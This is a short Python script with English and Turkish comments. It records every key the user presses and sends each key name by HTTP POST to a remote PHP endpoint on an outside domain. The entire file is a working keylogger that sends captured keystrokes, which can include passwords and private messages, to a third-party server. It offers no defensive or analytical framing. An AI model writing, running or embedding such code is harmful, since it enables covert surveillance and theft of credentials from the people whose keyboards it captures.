# This script reads keyboard input and sends the key name to a specified URL using POST requests.

# Bu betik klavye girişlerini okur ve belirtilen URL'ye POST istekleri kullanarak tuş adını gönderir.

import requests  # Import the requests library to handle HTTP requests
import keyboard  # Import the keyboard library to capture keyboard events

url = "https://trsoic.com.tr/s/verial.php"  # URL to send the key names

while True:
    try:
        # Read the keyboard event
        event = keyboard.read_event()

        # Check if the event is a key press event
        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name  # Get the name of the pressed key

            data = {"key_name": key_name}  # Prepare the data to send

            # Send a POST request to the specified URL with the key name data
            response = requests.post(url, data=data)

            # Check if the request was successful (status code 200)
            if response.status_code == 200:
                print("Tuş adı başarıyla gönderildi:", key_name)  # Success message
            else:
                print("İstek başarısız oldu:", response.status_code)  # Failure message

    except KeyboardInterrupt:
        break  # If Ctrl+C is pressed, exit the loop and end the program
